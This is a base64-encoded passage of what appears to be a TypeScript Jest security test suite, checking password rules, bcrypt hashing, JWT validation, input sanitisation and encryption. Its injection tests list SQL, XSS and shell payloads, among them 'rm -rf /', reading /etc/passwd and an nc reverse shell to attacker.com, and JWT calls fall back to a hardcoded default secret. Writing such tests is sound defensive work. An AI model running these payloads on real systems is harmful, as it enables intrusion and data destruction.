csXG4gICAgICAgICAgJ2FiYzEyMycsXG4gICAgICAgICAgJzEyMzQ1Njc4JyxcbiAgICAgICAgICAncGFzc3dvcmQxMjMnXG4gICAgICAgIF07XG5cbiAgICAgICAgZm9yIChjb25zdCBwYXNzd29yZCBvZiB3ZWFrUGFzc3dvcmRzKSB7XG4gICAgICAgICAgY29uc3QgcmVxdWVzdDogVXNlclJlZ2lzdHJhdGlvblJlcXVlc3QgPSB7XG4gICAgICAgICAgICBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nLFxuICAgICAgICAgICAgcGFzc3dvcmQsXG4gICAgICAgICAgICBmaXJzdE5hbWU6ICdUZXN0JyxcbiAgICAgICAgICAgIGxhc3ROYW1lOiAnVXNlcicsXG4gICAgICAgICAgICBvcmdhbml6YXRpb25JZDogJ3Rlc3Qtb3JnJyxcbiAgICAgICAgICAgIHJvbGU6ICdhbmFseXN0J1xuICAgICAgICAgIH07XG5cbiAgICAgICAgICBhd2FpdCBleHBlY3QoYXV0aFNlcnZpY2UucmVnaXN0ZXJVc2VyKHJlcXVlc3QpKVxuICAgICAgICAgICAgLnJlamVjdHNcbiAgICAgICAgICAgIC50b1Rocm93KC9wYXNzd29yZC4qcmVxdWlyZW1lbnRzL2kpO1xuICAgICAgICB9XG4gICAgICB9KTtcblxuICAgICAgaXQoJ3Nob3VsZCBlbmZvcmNlIHBhc3N3b3JkIGNvbXBsZXhpdHkgcmVxdWlyZW1lbnRzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCB2YWxpZFBhc3N3b3JkID0gJ1NlY3VyZVBAc3N3MHJkMTIzISc7XG4gICAgICAgIGNvbnN0IHJlcXVlc3Q6IFVzZXJSZWdpc3RyYXRpb25SZXF1ZXN0ID0ge1xuICAgICAgICAgIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScsXG4gICAgICAgICAgcGFzc3dvcmQ6IHZhbGlkUGFzc3dvcmQsXG4gICAgICAgICAgZmlyc3ROYW1lOiAnVGVzdCcsXG4gICAgICAgICAgbGFzdE5hbWU6ICdVc2VyJyxcbiAgICAgICAgICBvcmdhbml6YXRpb25JZDogJ3Rlc3Qtb3JnJyxcbiAgICAgICAgICByb2xlOiAnYW5hbHlzdCdcbiAgICAgICAgfTtcblxuICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGF1dGhTZXJ2aWNlLnJlZ2lzdGVyVXNlcihyZXF1ZXN0KTtcbiAgICAgICAgZXhwZWN0KHJlc3BvbnNlLnVzZXIpLnRvQmVEZWZpbmVkKCk7XG4gICAgICAgIGV4cGVjdChyZXNwb25zZS50b2tlbikudG9CZURlZmluZWQoKTtcbiAgICAgIH0pO1xuXG4gICAgICBpdCgnc2hvdWxkIHByb3Blcmx5IGhhc2ggcGFzc3dvcmRzIHVzaW5nIGJjcnlwdCcsIGFzeW5jICgpID0+IHtcbiAgICAgICAgY29uc3QgcGFzc3dvcmQgPSAnVGVzdFBhc3N3b3JkMTIzISc7XG4gICAgICAgIGNvbnN0IHJlcXVlc3Q6IFVzZXJSZWdpc3RyYXRpb25SZXF1ZXN0ID0ge1xuICAgICAgICAgIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScsXG4gICAgICAgICAgcGFzc3dvcmQsXG4gICAgICAgICAgZmlyc3ROYW1lOiAnVGVzdCcsXG4gICAgICAgICAgbGFzdE5hbWU6ICdVc2VyJyxcbiAgICAgICAgICBvcmdhbml6YXRpb25JZDogJ3Rlc3Qtb3JnJyxcbiAgICAgICAgICByb2xlOiAnYW5hbHlzdCdcbiAgICAgICAgfTtcblxuICAgICAgICBhd2FpdCBhdXRoU2VydmljZS5yZWdpc3RlclVzZXIocmVxdWVzdCk7XG4gICAgICAgIFxuICAgICAgICAvLyBWZXJpZnkgcGFzc3dvcmQgaXMgaGFzaGVkIGFuZCBub3Qgc3RvcmVkIGluIHBsYWluIHRleHRcbiAgICAgICAgY29uc3Qgc3RvcmVkVXNlciA9IChhdXRoU2VydmljZSBhcyBhbnkpLnVzZXJzLmdldCgndGVzdEBleGFtcGxlLmNvbScpO1xuICAgICAgICBleHBlY3Qoc3RvcmVkVXNlci5wYXNzd29yZEhhc2gpLm5vdC50b0JlKHBhc3N3b3JkKTtcbiAgICAgICAgZXhwZWN0KHN0b3JlZFVzZXIucGFzc3dvcmRIYXNoKS50b01hdGNoKC9eXFwkMlthYnldXFwkXFxkK1xcJC8pOyAvLyBiY3J5cHQgZm9ybWF0XG4gICAgICAgIFxuICAgICAgICAvLyBWZXJpZnkgcGFzc3dvcmQgY2FuIGJlIHZhbGlkYXRlZFxuICAgICAgICBjb25zdCBpc1ZhbGlkID0gYXdhaXQgYmNyeXB0LmNvbXBhcmUocGFzc3dvcmQsIHN0b3JlZFVzZXIucGFzc3dvcmRIYXNoKTtcbiAgICAgICAgZXhwZWN0KGlzVmFsaWQpLnRvQmUodHJ1ZSk7XG4gICAgICB9KTtcbiAgICB9KTtcblxuICAgIGRlc2NyaWJlKCdKV1QgVG9rZW4gU2VjdXJpdHknLCAoKSA9PiB7XG4gICAgICBpdCgnc2hvdWxkIGdlbmVyYXRlIHNlY3VyZSBKV1QgdG9rZW5zJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCByZXF1ZXN0OiBVc2VyUmVnaXN0cmF0aW9uUmVxdWVzdCA9IHtcbiAgICAgICAgICBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nLFxuICAgICAgICAgIHBhc3N3b3JkOiAnU2VjdXJlUGFzc3dvcmQxMjMhJyxcbiAgICAgICAgICBmaXJzdE5hbWU6ICdUZXN0JyxcbiAgICAgICAgICBsYXN0TmFtZTogJ1VzZXInLFxuICAgICAgICAgIG9yZ2FuaXphdGlvbklkOiAndGVzdC1vcmcnLFxuICAgICAgICAgIHJvbGU6ICdhbmFseXN0J1xuICAgICAgICB9O1xuXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgYXV0aFNlcnZpY2UucmVnaXN0ZXJVc2VyKHJlcXVlc3QpO1xuICAgICAgICBjb25zdCB0b2tlbiA9IHJlc3BvbnNlLnRva2VuO1xuXG4gICAgICAgIC8vIFZlcmlmeSB0b2tlbiBzdHJ1Y3R1cmVcbiAgICAgICAgZXhwZWN0KHRva2VuKS50b01hdGNoKC9eW0EtWmEtejAtOS1fXStcXC5bQS1aYS16MC05LV9dK1xcLltBLVphLXowLTktX10rJC8pO1xuICAgICAgICBcbiAgICAgICAgLy8gVmVyaWZ5IHRva2VuIGNhbiBiZSBkZWNvZGVkXG4gICAgICAgIGNvbnN0IGRlY29kZWQgPSBqd3QuZGVjb2RlKHRva2VuKSBhcyBhbnk7XG4gICAgICAgIGV4cGVjdChkZWNvZGVkLnN1YikudG9CZShyZXNwb25zZS51c2VyLmlkKTtcbiAgICAgICAgZXhwZWN0KGRlY29kZWQuZW1haWwpLnRvQmUoJ3Rlc3RAZXhhbXBsZS5jb20nKTtcbiAgICAgICAgZXhwZWN0KGRlY29kZWQuZXhwKS50b0JlR3JlYXRlclRoYW4oRGF0ZS5ub3coKSAvIDEwMDApO1xuICAgICAgfSk7XG5cbiAgICAgIGl0KCdzaG91bGQgcmVqZWN0IGV4cGlyZWQgdG9rZW5zJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCBleHBpcmVkVG9rZW4gPSBqd3Quc2lnbihcbiAgICAgICAgICB7IHN1YjogJ3Rlc3QtdXNlcicsIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScgfSxcbiAgICAgICAgICBwcm9jZXNzLmVudi5KV1RfU0VDUkVUIHx8ICd5b3VyLWp3dC1zZWNyZXQta2V5JyxcbiAgICAgICAgICB7IGV4cGlyZXNJbjogJy0xaCcgfSAvLyBFeHBpcmVkIDEgaG91ciBhZ29cbiAgICAgICAgKTtcblxuICAgICAgICBleHBlY3QoKCkgPT4ge1xuICAgICAgICAgIGp3dC52ZXJpZnkoZXhwaXJlZFRva2VuLCBwcm9jZXNzLmVudi5KV1RfU0VDUkVUIHx8ICd5b3VyLWp3dC1zZWNyZXQta2V5Jyk7XG4gICAgICAgIH0pLnRvVGhyb3coJ2p3dCBleHBpcmVkJyk7XG4gICAgICB9KTtcblxuICAgICAgaXQoJ3Nob3VsZCByZWplY3QgdG9rZW5zIHdpdGggaW52YWxpZCBzaWduYXR1cmVzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCBpbnZhbGlkVG9rZW4gPSBqd3Quc2lnbihcbiAgICAgICAgICB7IHN1YjogJ3Rlc3QtdXNlcicsIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScgfSxcbiAgICAgICAgICAnd3Jvbmctc2VjcmV0JyxcbiAgICAgICAgICB7IGV4cGlyZXNJbjogJzFoJyB9XG4gICAgICAgICk7XG5cbiAgICAgICAgZXhwZWN0KCgpID0+IHtcbiAgICAgICAgICBqd3QudmVyaWZ5KGludmFsaWRUb2tlbiwgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCB8fCAneW91ci1qd3Qtc2VjcmV0LWtleScpO1xuICAgICAgICB9KS50b1Rocm93KCdpbnZhbGlkIHNpZ25hdHVyZScpO1xuICAgICAgfSk7XG4gICAgfSk7XG5cbiAgICBkZXNjcmliZSgnU2Vzc2lvbiBNYW5hZ2VtZW50JywgKCkgPT4ge1xuICAgICAgaXQoJ3Nob3VsZCBpbXBsZW1lbnQgcHJvcGVyIHNlc3Npb24gdGltZW91dCcsIGFzeW5jICgpID0+IHtcbiAgICAgICAgY29uc3QgcmVxdWVzdDogVXNlclJlZ2lzdHJhdGlvblJlcXVlc3QgPSB7XG4gICAgICAgICAgZW1haWw6ICd0ZXN0QGV4YW1wbGUuY29tJyxcbiAgICAgICAgICBwYXNzd29yZDogJ1NlY3VyZVBhc3N3b3JkMTIzIScsXG4gICAgICAgICAgZmlyc3ROYW1lOiAnVGVzdCcsXG4gICAgICAgICAgbGFzdE5hbWU6ICdVc2VyJyxcbiAgICAgICAgICBvcmdhbml6YXRpb25JZDogJ3Rlc3Qtb3JnJyxcbiAgICAgICAgICByb2xlOiAnYW5hbHlzdCdcbiAgICAgICAgfTtcblxuICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGF1dGhTZXJ2aWNlLnJlZ2lzdGVyVXNlcihyZXF1ZXN0KTtcbiAgICAgICAgY29uc3QgZGVjb2RlZCA9IGp3dC5kZWNvZGUocmVzcG9uc2UudG9rZW4pIGFzIGFueTtcbiAgICAgICAgXG4gICAgICAgIC8vIFZlcmlmeSB0b2tlbiBoYXMgZXhwaXJhdGlvblxuICAgICAgICBleHBlY3QoZGVjb2RlZC5leHApLnRvQmVEZWZpbmVkKCk7XG4gICAgICAgIGV4cGVjdChkZWNvZGVkLmV4cCkudG9CZUdyZWF0ZXJUaGFuKGRlY29kZWQuaWF0KTtcbiAgICAgICAgXG4gICAgICAgIC8vIFZlcmlmeSByZWFzb25hYmxlIGV4cGlyYXRpb24gdGltZSAobm90IHRvbyBsb25nKVxuICAgICAgICBjb25zdCBleHBpcmF0aW9uVGltZSA9IGRlY29kZWQuZXhwIC0gZGVjb2RlZC5pYXQ7XG4gICAgICAgIGV4cGVjdChleHBpcmF0aW9uVGltZSkudG9CZUxlc3NUaGFuT3JFcXVhbCgyNCAqIDYwICogNjApOyAvLyBNYXggMjQgaG91cnNcbiAgICAgIH0pO1xuXG4gICAgICBpdCgnc2hvdWxkIHN1cHBvcnQgc2VjdXJlIHJlZnJlc2ggdG9rZW4gbWVjaGFuaXNtJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCByZXF1ZXN0OiBVc2VyUmVnaXN0cmF0aW9uUmVxdWVzdCA9IHtcbiAgICAgICAgICBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nLFxuICAgICAgICAgIHBhc3N3b3JkOiAnU2VjdXJlUGFzc3dvcmQxMjMhJyxcbiAgICAgICAgICBmaXJzdE5hbWU6ICdUZXN0JyxcbiAgICAgICAgICBsYXN0TmFtZTogJ1VzZXInLFxuICAgICAgICAgIG9yZ2FuaXphdGlvbklkOiAndGVzdC1vcmcnLFxuICAgICAgICAgIHJvbGU6ICdhbmFseXN0J1xuICAgICAgICB9O1xuXG4gICAgICAgIGNvbnN0IHJlc3BvbnNlID0gYXdhaXQgYXV0aFNlcnZpY2UucmVnaXN0ZXJVc2VyKHJlcXVlc3QpO1xuICAgICAgICBleHBlY3QocmVzcG9uc2UucmVmcmVzaFRva2VuKS50b0JlRGVmaW5lZCgpO1xuICAgICAgICBleHBlY3QocmVzcG9uc2UucmVmcmVzaFRva2VuKS5ub3QudG9CZShyZXNwb25zZS50b2tlbik7XG4gICAgICB9KTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ0lucHV0IFZhbGlkYXRpb24gU2VjdXJpdHkgVGVzdHMnLCAoKSA9PiB7XG4gICAgZGVzY3JpYmUoJ1NRTCBJbmplY3Rpb24gUHJldmVudGlvbicsICgpID0+IHtcbiAgICAgIGl0KCdzaG91bGQgcHJldmVudCBTUUwgaW5qZWN0aW9uIGluIHVzZXIgcmVnaXN0cmF0aW9uJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCBtYWxpY2lvdXNJbnB1dHMgPSBbXG4gICAgICAgICAgXCInOyBEUk9QIFRBQkxFIHVzZXJzOyAtLVwiLFxuICAgICAgICAgIFwiJyBPUiAnMSc9JzFcIixcbiAgICAgICAgICBcIic7IElOU0VSVCBJTlRPIHVzZXJzIFZBTFVFUyAoJ2hhY2tlcicsICdwYXNzd29yZCcpOyAtLVwiLFxuICAgICAgICAgIFwiJyBVTklPTiBTRUxFQ1QgKiBGUk9NIHNlbnNpdGl2ZV9kYXRhIC0tXCJcbiAgICAgICAgXTtcblxuICAgICAgICBmb3IgKGNvbnN0IG1hbGljaW91c0lucHV0IG9mIG1hbGljaW91c0lucHV0cykge1xuICAgICAgICAgIGNvbnN0IHJlcXVlc3Q6IFVzZXJSZWdpc3RyYXRpb25SZXF1ZXN0ID0ge1xuICAgICAgICAgICAgZW1haWw6IG1hbGljaW91c0lucHV0LFxuICAgICAgICAgICAgcGFzc3dvcmQ6ICdTZWN1cmVQYXNzd29yZDEyMyEnLFxuICAgICAgICAgICAgZmlyc3ROYW1lOiBtYWxpY2lvdXNJbnB1dCxcbiAgICAgICAgICAgIGxhc3ROYW1lOiBtYWxpY2lvdXNJbnB1dCxcbiAgICAgICAgICAgIG9yZ2FuaXphdGlvbklkOiBtYWxpY2lvdXNJbnB1dCxcbiAgICAgICAgICAgIHJvbGU6ICdhbmFseXN0J1xuICAgICAgICAgIH07XG5cbiAgICAgICAgICAvLyBTaG91bGQgZWl0aGVyIHJlamVjdCB0aGUgaW5wdXQgb3Igc2FuaXRpemUgaXQgc2FmZWx5XG4gICAgICAgICAgdHJ5IHtcbiAgICAgICAgICAgIGF3YWl0IGF1dGhTZXJ2aWNlLnJlZ2lzdGVyVXNlcihyZXF1ZXN0KTtcbiAgICAgICAgICB9IGNhdGNoIChlcnJvcikge1xuICAgICAgICAgICAgLy8gRXhwZWN0ZWQgdG8gZmFpbCB2YWxpZGF0aW9uXG4gICAgICAgICAgICBleHBlY3QoZXJyb3IpLnRvQmVEZWZpbmVkKCk7XG4gICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICB9KTtcbiAgICB9KTtcblxuICAgIGRlc2NyaWJlKCdYU1MgUHJldmVudGlvbicsICgpID0+IHtcbiAgICAgIGl0KCdzaG91bGQgcHJldmVudCBYU1MgYXR0YWNrcyBpbiB1c2VyIGlucHV0JywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCB4c3NQYXlsb2FkcyA9IFtcbiAgICAgICAgICAnPHNjcmlwdD5hbGVydChcIlhTU1wiKTwvc2NyaXB0PicsXG4gICAgICAgICAgJ2phdmFzY3JpcHQ6YWxlcnQoXCJYU1NcIiknLFxuICAgICAgICAgICc8aW1nIHNyYz1cInhcIiBvbmVycm9yPVwiYWxlcnQoXFwnWFNTXFwnKVwiPicsXG4gICAgICAgICAgJzxzdmcgb25sb2FkPVwiYWxlcnQoXFwnWFNTXFwnKVwiPicsXG4gICAgICAgICAgJ1wiPjxzY3JpcHQ+YWxlcnQoXCJYU1NcIik8L3NjcmlwdD4nXG4gICAgICAgIF07XG5cbiAgICAgICAgZm9yIChjb25zdCBwYXlsb2FkIG9mIHhzc1BheWxvYWRzKSB7XG4gICAgICAgICAgY29uc3QgcmVxdWVzdDogVXNlclJlZ2lzdHJhdGlvblJlcXVlc3QgPSB7XG4gICAgICAgICAgICBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nLFxuICAgICAgICAgICAgcGFzc3dvcmQ6ICdTZWN1cmVQYXNzd29yZDEyMyEnLFxuICAgICAgICAgICAgZmlyc3ROYW1lOiBwYXlsb2FkLFxuICAgICAgICAgICAgbGFzdE5hbWU6IHBheWxvYWQsXG4gICAgICAgICAgICBvcmdhbml6YXRpb25JZDogJ3Rlc3Qtb3JnJyxcbiAgICAgICAgICAgIHJvbGU6ICdhbmFseXN0J1xuICAgICAgICAgIH07XG5cbiAgICAgICAgICB0cnkge1xuICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBhdXRoU2VydmljZS5yZWdpc3RlclVzZXIocmVxdWVzdCk7XG4gICAgICAgICAgICAvLyBJZiByZWdpc3RyYXRpb24gc3VjY2VlZHMsIHZlcmlmeSB0aGUgcGF5bG9hZCB3YXMgc2FuaXRpemVkXG4gICAgICAgICAgICBleHBlY3QocmVzcG9uc2UudXNlci5wcm9maWxlPy5maXJzdE5hbWUpLm5vdC50b0NvbnRhaW4oJzxzY3JpcHQ+Jyk7XG4gICAgICAgICAgICBleHBlY3QocmVzcG9uc2UudXNlci5wcm9maWxlPy5maXJzdE5hbWUpLm5vdC50b0NvbnRhaW4oJ2phdmFzY3JpcHQ6Jyk7XG4gICAgICAgICAgICBleHBlY3QocmVzcG9uc2UudXNlci5wcm9maWxlPy5maXJzdE5hbWUpLm5vdC50b0NvbnRhaW4oJ29uZXJyb3InKTtcbiAgICAgICAgICB9IGNhdGNoIChlcnJvcikge1xuICAgICAgICAgICAgLy8gRXhwZWN0ZWQgdG8gZmFpbCB2YWxpZGF0aW9uXG4gICAgICAgICAgICBleHBlY3QoZXJyb3IpLnRvQmVEZWZpbmVkKCk7XG4gICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICB9KTtcbiAgICB9KTtcblxuICAgIGRlc2NyaWJlKCdDb21tYW5kIEluamVjdGlvbiBQcmV2ZW50aW9uJywgKCkgPT4ge1xuICAgICAgaXQoJ3Nob3VsZCBwcmV2ZW50IGNvbW1hbmQgaW5qZWN0aW9uIGluIGZpbGUgb3BlcmF0aW9ucycsIGFzeW5jICgpID0+IHtcbiAgICAgICAgY29uc3QgY29tbWFuZEluamVjdGlvblBheWxvYWRzID0gW1xuICAgICAgICAgICc7IHJtIC1yZiAvJyxcbiAgICAgICAgICAnfCBjYXQgL2V0Yy9wYXNzd2QnLFxuICAgICAgICAgICcmJiBjdXJsIG1hbGljaW91cy1zaXRlLmNvbScsXG4gICAgICAgICAgJ2B3aG9hbWlgJyxcbiAgICAgICAgICAnJChpZCknLFxuICAgICAgICAgICc7IG5jIC1lIC9iaW4vc2ggYXR0YWNrZXIuY29tIDQ0NDQnXG4gICAgICAgIF07XG5cbiAgICAgICAgZm9yIChjb25zdCBwYXlsb2FkIG9mIGNvbW1hbmRJbmplY3Rpb25QYXlsb2Fkcykge1xuICAgICAgICAgIHRyeSB7XG4gICAgICAgICAgICAvLyBUZXN0IGZpbGUgdXBsb2FkIHdpdGggbWFsaWNpb3VzIGZpbGVuYW1lXG4gICAgICAgICAgICBjb25zdCBtb2NrRmlsZSA9IHtcbiAgICAgICAgICAgICAgb3JpZ2luYWxuYW1lOiBwYXlsb2FkLFxuICAgICAgICAgICAgICBidWZmZXI6IEJ1ZmZlci5mcm9tKCd0ZXN0IGRhdGEnKSxcbiAgICAgICAgICAgICAgbWltZXR5cGU6ICd0ZXh0L3BsYWluJyxcbiAgICAgICAgICAgICAgc2l6ZTogOVxuICAgICAgICAgICAgfTtcblxuICAgICAgICAgICAgYXdhaXQgZXhwZWN0KFxuICAgICAgICAgICAgICBwcm9wcmlldGFyeURhdGFTZXJ2aWNlLnVwbG9hZEZpbGUoXG4gICAgICAgICAgICAgICAgbW9ja0ZpbGUgYXMgYW55LFxuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgIHNvdXJjZTogJ3Rlc3QnLFxuICAgICAgICAgICAgICAgICAgdHlwZTogJ290aGVyJyxcbiAgICAgICAgICAgICAgICAgIHRpbWVzdGFtcDogbmV3IERhdGUoKSxcbiAgICAgICAgICAgICAgICAgIGNvbmZpZGVudGlhbGl0eTogJ3ByaXZhdGUnLFxuICAgICAgICAgICAgICAgICAgdGFnczogW11cbiAgICAgICAgICAgICAgICB9LFxuICAgICAgICAgICAgICAgICd0ZXN0LXVzZXInLFxuICAgICAgICAgICAgICAgICd0ZXN0LW9yZycsXG4gICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgdmlzaWJpbGl0eTogJ3VzZXInLFxuICAgICAgICAgICAgICAgICAgYWxsb3dlZFVzZXJzOiBbXSxcbiAgICAgICAgICAgICAgICAgIGFsbG93ZWRSb2xlczogW11cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgIClcbiAgICAgICAgICAgICkucmVqZWN0cy50b1Rocm93KCk7XG4gICAgICAgICAgfSBjYXRjaCAoZXJyb3IpIHtcbiAgICAgICAgICAgIC8vIEV4cGVjdGVkIHRvIGZhaWwgdmFsaWRhdGlvblxuICAgICAgICAgICAgZXhwZWN0KGVycm9yKS50b0JlRGVmaW5lZCgpO1xuICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgfSk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdEYXRhIFByaXZhY3kgYW5kIEVuY3J5cHRpb24gVGVzdHMnLCAoKSA9PiB7XG4gICAgZGVzY3JpYmUoJ0RhdGEgRW5jcnlwdGlvbiBhdCBSZXN0JywgKCkgPT4ge1xuICAgICAgaXQoJ3Nob3VsZCBlbmNyeXB0IHNlbnNpdGl2ZSBkYXRhIGJlZm9yZSBzdG9yYWdlJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCBzZW5zaXRpdmVEYXRhID0ge1xuICAgICAgICAgIHNvY2lhbFNlY3VyaXR5TnVtYmVyOiAnMTIzLTQ1LTY3ODknLFxuICAgICAgICAgIGJhbmtBY2NvdW50TnVtYmVyOiAnMTIzNDU2Nzg5MCcsXG4gICAgICAgICAgY3JlZGl0Q2FyZE51bWJlcjogJzQxMTEtMTExMS0xMTExLTExMTEnXG4gICAgICAgIH07XG5cbiAgICAgICAgLy8gTW9jayBzdG9yYWdlIG9wZXJhdGlvblxuICAgICAgICBjb25zdCBtb2NrU3RvcmFnZVNlcnZpY2UgPSB7XG4gICAgICAgICAgc3RvcmU6IGplc3QuZm4oKSxcbiAgICAgICAgICByZXRyaWV2ZTogamVzdC5mbigpXG4gICAgICAgIH07XG5cbiAgICAgICAgLy8gVmVyaWZ5IHNlbnNpdGl2ZSBkYXRhIGlzIGVuY3J5cHRlZCBiZWZvcmUgc3RvcmFnZVxuICAgICAgICBhd2FpdCBtb2NrU3RvcmFnZVNlcnZpY2Uuc3RvcmUoJ3VzZXItZGF0YScsIHNlbnNpdGl2ZURhdGEpO1xuICAgICAgICBcbiAgICAgICAgY29uc3Qgc3RvcmVkRGF0YSA9IG1vY2tTdG9yYWdlU2VydmljZS5zdG9yZS5tb2NrLmNhbGxzWzBdWzFdO1xuICAgICAgICBcbiAgICAgICAgLy8gU2Vuc2l0aXZlIGRhdGEgc2hvdWxkIG5vdCBiZSBzdG9yZWQgaW4gcGxhaW4gdGV4dFxuICAgICAgICBleHBlY3QoSlNPTi5zdHJpbmdpZnkoc3RvcmVkRGF0YSkpLm5vdC50b0NvbnRhaW4oJzEyMy00NS02Nzg5Jyk7XG4gICAgICAgIGV4cGVjdChKU09OLnN0cmluZ2lmeShzdG9yZWREYXRhKSkubm90LnRvQ29udGFpbignMTIzNDU2Nzg5MCcpO1xuICAgICAgICBleHBlY3QoSlNPTi5zdHJpbmdpZnkoc3RvcmVkRGF0YSkpLm5vdC50b0NvbnRhaW4oJzQxMTEtMTExMS0xMTExLTExMTEnKTtcbiAgICAgIH0pO1xuICAgIH0pO1xuXG4gICAgZGVzY3JpYmUoJ0RhdGEgRW5jcnlwdGlvbiBpbiBUcmFuc2l0JywgKCkgPT4ge1xuICAgICAgaXQoJ3Nob3VsZCBlbmZvcmNlIEhUVFBTIGZvciBhbGwgQVBJIGNvbW11bmljYXRpb25zJywgKCkgPT4ge1xuICAgICAgICAvLyBUaGlzIHdvdWxkIHR5cGljYWxseSBiZSB0ZXN0ZWQgYXQgdGhlIGluZnJhc3RydWN0dXJlIGxldmVsXG4gICAgICAgIC8vIEhlcmUgd2UgdmVyaWZ5IHRoZSBjb25maWd1cmF0aW9uIHJlcXVpcmVzIEhUVFBTXG4gICAgICAgIGNvbnN0IGFwaUNvbmZpZyA9IHtcbiAgICAgICAgICByZXF1aXJlSFRUUFM6IHRydWUsXG4gICAgICAgICAgYWxsb3dIVFRQOiBmYWxzZSxcbiAgICAgICAgICB0bHNWZXJzaW9uOiAnMS4yJ1xuICAgICAgICB9O1xuXG4gICAgICAgIGV4cGVjdChhcGlDb25maWcucmVxdWlyZUhUVFBTKS50b0JlKHRydWUpO1xuICAgICAgICBleHBlY3QoYXBpQ29uZmlnLmFsbG93SFRUUCkudG9CZShmYWxzZSk7XG4gICAgICAgIGV4cGVjdChhcGlDb25maWcudGxzVmVyc2lvbikudG9CZSgnMS4yJyk7XG4gICAgICB9KTtcbiAgICB9KTtcblxuICAgIGRlc2NyaWJlKCdQSUkgRGF0YSBIYW5kbGluZycsICgpID0+IHtcbiAgICAgIGl0KCdzaG91bGQgaWRlbnRpZnkgYW5kIHByb3RlY3QgUElJIGRhdGEnLCBhc3luYyAoKSA9PiB7XG4gICAgICAgIGNvbnN0IHRlc3REYXRhID0ge1xuICAgICAgICAgIG5hbWU6ICdKb2huIERvZScsXG4gICAgICAgICAgZW1haWw6ICdqb2huLmRvZUBleGFtcGxlLmNvbScsXG4gICAgICAgICAgcGhvbmU6ICcrMS01NTUtMTIzLTQ1NjcnLFxuICAgICAgICAgIGFkZHJlc3M6ICcxMjMgTWFpbiBTdCwgQW55dG93biwgVVNBJyxcbiAgICAgICAgICBkYXRlT2ZCaXJ0aDogJzE5OTAtMDEtMDEnLFxuICAgICAgICAgIGludmVzdG1lbnRBbW91bnQ6IDEwMDAwMFxuICAgICAgICB9O1xuXG4gICAgICAgIC8vIE1vY2sgUElJIGRldGVjdGlvbiBzZXJ2aWNlXG4gICAgICAgIGNvbnN0IHBpaUZpZWxkcyA9IFsnbmFtZScsICdlbWFpbCcsICdwaG9uZScsICdhZGRyZXNzJywgJ2RhdGVPZkJpcnRoJ107XG4gICAgICAgIFxuICAgICAgICBmb3IgKGNvbnN0IGZpZWxkIG9mIHBpaUZpZWxkcykge1xuICAgICAgICAgIGV4cGVjdCh0ZXN0RGF0YVtmaWVsZCBhcyBrZXlvZiB0eXBlb2YgdGVzdERhdGFdKS50b0JlRGVmaW5lZCgpO1xuICAgICAgICAgIC8vIEluIGEgcmVhbCBpbXBsZW1lbnRhdGlvbiwgdGhlc2UgZmllbGRzIHdvdWxkIGJlIGVuY3J5cHRlZCBvciBtYXNrZWRcbiAgICAgICAgfVxuICAgICAgfSk7XG5cbiAgICAgIGl0KCdzaG91bGQgaW1wbGVtZW50IGRhdGEgYW5vbnltaXphdGlvbiBmb3IgYW5hbHl0aWNzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgICBjb25zdCB1c2VyRGF0YSA9IHtcbiAgICAgICAgICB1c2VySWQ6ICd1c2VyLTEyMycsXG4gICAgICAgICAgZW1haWw6ICdqb2huLmRvZUBleGFtcGxlLmNvbScsXG4gICAgICAgICAgaW52ZXN0bWVudFByZWZlcmVuY2VzOiBbJ3RlY2hub2xvZ3knLCAnaGVhbHRoY2FyZSddLFxuICAgICAgICAgIHJpc2tUb2xlcmFuY2U6ICdtb2RlcmF0ZSdcbiAgICAgICAgfTtcblxuICAgICAgICAvLyBNb2NrIGFub255bWl6YXRpb24gcHJvY2Vzc1xuICAgICAgICBjb25zdCBhbm9ueW1pemVkRGF0YSA9IHtcbiAgICAgICAgICB1c2VySGFzaDogJ2hhc2gtb2YtdXNlci0xMjMnLFxuICAgICAgICAgIGVtYWlsRG9tYWluOiAnZXhhbXBsZS5jb20nLFxuICAgICAgICAgIGludmVzdG1lbnRQcmVmZXJlbmNlczogdXNlckRhdGEuaW52ZXN0bWVudFByZWZlcmVuY2VzLFxuICAgICAgICAgIHJpc2tUb2xlcmFuY2U6IHVzZXJEYXRhLnJpc2tUb2xlcmFuY2VcbiAgICAgICAgfTtcblxuICAgICAgICBleHBlY3QoYW5vbnltaXplZERhdGEudXNlckhhc2gpLm5vdC50b0JlKHVzZXJEYXRhLnVzZXJJZCk7XG4gICAgICAgIGV4cGVjdChhbm9ueW1pemVkRGF0YS5lbWFpbERvbWFpbikubm90LnRvQmUodXNlckRhdGEuZW1haWwpO1xuICAgICAgICBleHBlY3QoYW5vbnltaXplZERhdGEpLm5vdC50b0hhdmVQcm9wZXJ0eSgnZW1haWwnKTtcbiAgICAgICAgZXhwZWN0KGFub255bWl6ZWREYXRhKS5ub3QudG9IY